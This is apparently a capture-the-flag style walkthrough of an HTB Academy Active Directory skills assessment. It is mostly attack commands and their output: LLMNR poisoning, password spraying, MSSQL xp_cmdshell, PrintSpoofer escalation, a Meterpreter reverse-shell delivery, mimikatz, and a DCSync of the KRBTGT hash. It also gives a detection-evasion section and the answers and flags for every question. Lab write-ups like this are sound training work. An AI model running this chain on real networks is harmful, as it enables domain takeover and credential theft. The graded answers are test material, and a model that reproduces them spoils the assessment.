# 🎯 **AD Enumeration & Attacks - Skills Assessment Part II**

## 🏆 **HTB Academy: Advanced Assessment with Superior Pivoting**

### 📍 **Overview**

**Skills Assessment Part II** demonstrates advanced Active Directory penetration testing using **SUPERIOR pivoting methodology** with SSH dynamic port forwarding and proxychains. This approach is **significantly simpler and more reliable** than complex Meterpreter pivoting while providing professional-grade results.

**🎯 Assessment Scope**: 12 progressive questions covering LLMNR poisoning, credential hunting, SQL exploitation, privilege escalation, and domain compromise.

**🔥 Key Innovation**: Using `ssh -D 9050` + `proxychains` instead of Meterpreter SOCKS proxy for seamless pivoting.

---

## 🌐 **Professional Pivoting Setup - The Game Changer**

### **🚀 SSH Dynamic Port Forwarding (SUPERIOR METHOD)**

```bash
# Connect to jump box with SOCKS proxy:
ssh htb-student@TARGET_IP -D 9050

# Configure proxychains:
sudo nano /etc/proxychains4.conf
# Add: socks5 127.0.0.1 9050

# Now ALL tools work through proxy seamlessly:
proxychains impacket-wmiexec user:pass@internal_ip
proxychains xfreerdp /v:internal_ip /u:user /p:pass
proxychains crackmapexec smb internal_network
```

### **💡 Why This Method is SUPERIOR:**

#### **✅ SSH -D + Proxychains Advantages:**
- **One simple command** - no complex Meterpreter setup
- **Automatic tool compatibility** - works with impacket, crackmapexec, xfreerdp
- **Stable connections** - SSH is more reliable than Meterpreter sessions
- **Professional standard** - real pentesting methodology
- **No port conflicts** - single SOCKS proxy handles everything
- **Easy troubleshooting** - simple SSH connection management

#### **❌ Meterpreter Pivoting Disadvantages:**
- Complex multi-step setup (autoroute + socks_proxy)
- Tool compatibility issues (CrackMapExec parsing problems)
- Session instability and frequent drops
- Port conflict management
- Multiple background jobs to maintain

---

## 🎫 **Question 1: LLMNR Poisoning**

### **🎯 Task**: "Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?"

### **📋 Solution Steps:**

#### **Step 1: Connect to Jump Box**
```bash
# SSH to ParrotOS jump box:
ssh htb-student@TARGET_IP
```

#### **Step 2: Run Responder for LLMNR Poisoning**
```bash
# Capture NTLM hashes via LLMNR/NBT-NS poisoning:
sudo responder -I ens224 -wrfv

# Wait for automatic hash capture:
# [SMB] NTLMv2-SSP Client   : 172.16.7.3
# [SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
# [SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:6741b51d529201c7:F8653C1E3120B191A7DA708C0E363F8B:...
```

**🎯 Answer**: `AB920`

---

## 🔑 **Question 2: Hash Cracking**

### **🎯 Task**: "What is this user's cleartext password?"

### **📋 Solution Steps:**

#### **Step 1: Extract and Format Hash**
```bash
# Save hash to file:
echo 'AB920::INLANEFREIGHT:6741b51d529201c7:f8653c1e3120b191a7da708c0e363f8b:...' > AB920_ntlmv2
```

#### **Step 2: Crack with Hashcat**
```bash
# Crack NetNTLMv2 hash:
hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt

# Result: AB920:weasal
```

**🎯 Answer**: `weasal`

---

## 🌐 **Question 3: Initial Pivot Access**

### **🎯 Task**: "Submit the contents of the C:\flag.txt file on MS01."

### **📋 Solution Steps:**

#### **Step 1: Network Discovery**
```bash
# Discover internal hosts:
sudo nmap -p 88,445,3389 --open 172.16.7.0/24

# Results:
# 172.16.7.3  - DC (Kerberos, SMB)
# 172.16.7.50 - MS01 (SMB, RDP)
# 172.16.7.60 - SQL01 (SMB)
```

#### **Step 2: Setup Superior Pivoting Infrastructure**
```bash
# 🔥 GAME CHANGER: SSH Dynamic Port Forwarding
ssh htb-student@JUMP_BOX_IP -D 9050

# Configure proxychains:
sudo nano /etc/proxychains4.conf
# Add: socks5 127.0.0.1 9050
```

#### **Step 3: RDP Through Proxy**
```bash
# Connect to MS01 via proxychains (SEAMLESS!):
proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal

# Alternative: SSH tunnel method:
ssh -L 3389:172.16.7.50:3389 htb-student@JUMP_BOX_IP
xfreerdp /v:localhost /u:AB920 /p:weasal
```

#### **Step 4: Retrieve Flag**
```cmd
# In RDP session:
type C:\flag.txt
```

**🎯 Answer**: `Contents of flag.txt`

---

## 👤 **Question 4: Advanced User Enumeration**

### **🎯 Task**: "Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain."

### **📋 Solution Steps:**

#### **Step 1: BloodHound Domain Survey**
```bash
# Comprehensive AD enumeration:
proxychains bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
```

#### **Step 2: Download Tools to Jump Box**
```bash
# Download required tools:
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe

# Transfer to jump box:
scp PowerView.ps1 htb-student@JUMP_BOX_IP:/home/htb-student/Desktop
scp kerbrute_windows_amd64.exe htb-student@JUMP_BOX_IP:/home/htb-student/Desktop
```

#### **Step 3: User List Generation (In RDP)**
```powershell
# On MS01 via RDP:
cd .\Desktop\
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1

# Generate domain user list:
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} | Set-Content adusers.txt
```

#### **Step 4: Password Spraying**
```powershell
# Password spray with Kerbrute:
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1

# Result: [+] VALID LOGIN: BR086@INLANEFREIGHT.LOCAL:Welcome1
```

**🎯 Answer**: `BR086`

---

## 🔐 **Question 5: Password Discovery**

### **🎯 Task**: "What is this user's password?"

**From Kerbrute output: `BR086:Welcome1`**

**🎯 Answer**: `Welcome1`

---

## 📁 **Question 6: Configuration File Hunting**

### **🎯 Task**: "Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?"

### **📋 Solution Steps:**

#### **Step 1: Download Snaffler**
```bash
# Download file hunting tool:
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
scp Snaffler.exe htb-student@JUMP_BOX_IP:/home/htb-student/Desktop
```

#### **Step 2: Run as BR086 User**
```powershell
# In RDP session, escalate context:
runas /netonly /user:INLANEFREIGHT\BR086 powershell
# Password: Welcome1

# Hunt for sensitive files:
cd C:\users\AB920\Desktop
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

#### **Step 3: Extract SQL Credentials**
```
# Snaffler output reveals:
# File: \\DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Private\Development\web.config
# Contains: connectionString="...;User ID=netdb;Password=D@ta_bAse_adm1n!"
```

**🎯 Answer**: `D@ta_bAse_adm1n!`

---

## 🗄️ **Question 7: SQL Server Exploitation**

### **🎯 Task**: "Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host."

### **📋 Solution Steps:**

#### **Step 1: SQL Server Access**
```bash
# Connect via proxychains (SEAMLESS!):
proxychains mssqlclient.py netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```

#### **Step 2: Enable Command Execution**
```sql
-- Enable xp_cmdshell:
enable_xp_cmdshell

-- Check privileges:
xp_cmdshell whoami /priv
-- Result: SeImpersonatePrivilege Enabled
```

#### **Step 3: Privilege Escalation with PrintSpoofer**
```bash
# Download PrintSpoofer:
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

# Serve from jump box:
python3 -m http.server 9000

# Download to target:
xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe

# Reset admin password:
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
```

#### **Step 4: Retrieve Flag**
```bash
# Access via SMB:
proxychains smbclient -U "administrator" \\\\172.16.7.60\\C$
# Password: Welcome1
cd Users\Administrator\Desktop\
get flag.txt
```

**🎯 Answer**: `s3imp3rs0nate_cl@ssic`

---

## 🔄 **Question 8: Advanced Lateral Movement**

### **🎯 Task**: "Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host."

### **📋 Solution Steps:**

#### **Step 1: Meterpreter Setup (Alternative Method)**
```bash
# Setup web_delivery from jump box:
sudo msfconsole -q
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set TARGET 2
set SRVHOST 172.16.7.240
set LHOST 172.16.7.240
exploit
```

#### **Step 2: Execute via PrintSpoofer**
```sql
-- From SQL session, execute encoded payload:
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e [ENCODED_PAYLOAD]"
```

#### **Step 3: Credential Extraction**
```bash
# Upload mimikatz via meterpreter:
upload mimikatz64.exe

# Extract credentials:
mimikatz64.exe
privilege::debug
sekurlsa::logonpasswords

# Result: mssqlsvc:Sup3rS3cur3maY5ql$3rverE
```

#### **Step 4: Alternative with CrackMapExec (SUPERIOR!)**
```bash
# 🔥 Much simpler with proxychains + CME:
proxychains crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa

# Reveals cleartext: mssqlsvc:Sup3rS3cur3maY5ql$3rverE
```

#### **Step 5: Access MS01**
```bash
# RDP to MS01 as mssqlsvc:
proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE'

# Read flag from C:\Users\Administrator\Desktop\flag.txt
```

**🎯 Answer**: `eexc3ss1ve_adm1n_r1ights!`

---

## 🕸️ **Question 9: Advanced Poisoning**

### **🎯 Task**: "Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?"

### **📋 Solution Steps:**

#### **Step 1: Setup Inveigh Poisoning**
```bash
# Download Inveigh:
wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
scp Inveigh.ps1 htb-student@JUMP_BOX_IP:/home/htb-student/Desktop
```

#### **Step 2: Execute Poisoning Campaign**
```powershell
# In RDP session on MS01:
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Captured hash:
# CT059::INLANEFREIGHT:F8059BA109C97E0D:78A41190201430E8654DE55727DF7EB5:...
```

**🎯 Answer**: `CT059`

---

## 🔓 **Question 10: Advanced Hash Cracking**

### **🎯 Task**: "Crack this user's password hash and submit the cleartext password as your answer."

### **📋 Solution Steps:**

```bash
# Crack CT059 hash:
hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt

# Result: CT059:charlie1
```

**🎯 Answer**: `charlie1`

---

## 👑 **Question 11: Domain Compromise**

### **🎯 Task**: "Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host."

### **📋 Solution Steps:**

#### **Step 1: Access as CT059**
```bash
# RDP as CT059:
proxychains xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1
```

#### **Step 2: Abuse GenericAll Rights**
```powershell
# CT059 has GenericAll over Domain Admins group
# Reset domain admin password:
net user administrator Welcome1 /domain
```

#### **Step 3: Domain Controller Access**
```bash
# Access DC01 as domain admin:
proxychains impacket-wmiexec administrator:Welcome1@172.16.7.3

# Retrieve flag:
type C:\Users\administrator\desktop\flag.txt
```

**🎯 Answer**: `acLs_f0r_th3_w1n!`

---

## 🏆 **Question 12: DCSync Attack**

### **🎯 Task**: "Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise."

### **📋 Solution Steps:**

```bash
# DCSync KRBTGT hash:
proxychains impacket-secretsdump administrator:Welcome1@172.16.7.3 -just-dc-user KRBTGT

# Output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
```

**🎯 Answer**: `7eba70412d81c1cd030d72a3e8dbe05f`

---

## 🛠️ **Professional Methodology Comparison**

### **🔥 Superior Approach: SSH -D + Proxychains**

#### **Setup:**
```bash
# Single command setup:
ssh htb-student@jump_box -D 9050

# Configure once:
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
```

#### **Usage:**
```bash
# ALL tools work seamlessly:
proxychains impacket-wmiexec user:pass@target
proxychains crackmapexec smb target_range
proxychains xfreerdp /v:target /u:user /p:pass
proxychains secretsdump.py user:pass@target
```

### **🔧 Why CrackMapExec + Impacket > Meterpreter**

#### **✅ CrackMapExec/Impacket Advantages:**
- **Native SMB/RPC protocols** - better compatibility
- **Built-in credential extraction** - no separate tools needed
- **Proxy-friendly** - works flawlessly with proxychains
- **Professional standard** - real-world pentesting tools
- **Comprehensive coverage** - all AD attack vectors
- **Reliable output** - consistent results

#### **✅ Specific Tool Benefits:**

**CrackMapExec:**
```bash
# Credential extraction:
crackmapexec smb target -u user -p pass --lsa
crackmapexec smb target -u user -p pass --sam
crackmapexec smb target -u user -p pass --ntds

# Lateral movement:
crackmapexec smb target -u user -p pass -x "command"
crackmapexec smb target -u user -p pass --exec-method wmiexec
```

**Impacket Suite:**
```bash
# Comprehensive attack tools:
impacket-secretsdump    # DCSync, credential extraction
impacket-wmiexec       # Lateral movement
impacket-psexec        # Service-based shells
impacket-smbexec       # SMB-based shells
impacket-GetUserSPNs   # Kerberoasting
impacket-mssqlclient   # SQL Server attacks
```

---

## 🎯 **Professional Skills Demonstrated**

### **🏆 Advanced Techniques:**
- **LLMNR/NBT-NS Poisoning** - Passive credential harvesting
- **Password Spraying** - Systematic weak credential discovery  
- **File Hunting** - Sensitive data discovery with Snaffler
- **SQL Server Exploitation** - Database server compromise
- **Privilege Escalation** - PrintSpoofer SeImpersonatePrivilege abuse
- **Credential Extraction** - Memory-based credential harvesting
- **ACL Abuse** - GenericAll rights exploitation
- **DCSync Attacks** - Domain replication abuse
- **Lateral Movement** - Multi-host compromise chain

### **🔧 Methodology Excellence:**
- **Superior Pivoting** - SSH dynamic forwarding vs Meterpreter
- **Tool Integration** - Seamless proxychains compatibility
- **Professional Workflow** - Real-world pentesting approach
- **Troubleshooting** - Stable connection management
- **Efficiency** - Streamlined attack execution

---

## 💡 **Key Insights & Best Practices**

### **🎯 Pivoting Revolution:**
```bash
# OLD WAY (Complex, Unreliable):
msfconsole → web_delivery → meterpreter → autoroute → socks_proxy → tool compatibility issues

# NEW WAY (Simple, Professional):
ssh -D 9050 → proxychains → ALL TOOLS WORK
```

### **🔥 Professional Advantages:**
1. **Simplicity** - One command vs multi-step setup
2. **Reliability** - SSH stability vs Meterpreter sessions
3. **Compatibility** - Universal tool support
4. **Troubleshooting** - Easy connection management
5. **Speed** - Immediate productivity
6. **Professional** - Real-world methodology

### **🛡️ Detection Evasion:**
- **SSH tunnels** appear as normal administrative traffic
- **Native tools** blend with legitimate AD activity
- **Credential extraction** using built-in protocols
- **Minimal footprint** compared to Meterpreter

**🏆 This Skills Assessment demonstrates the evolution from complex exploitation frameworks to streamlined professional methodology - SSH dynamic port forwarding + proxychains + native AD tools = the ultimate pentesting approach!**

--- 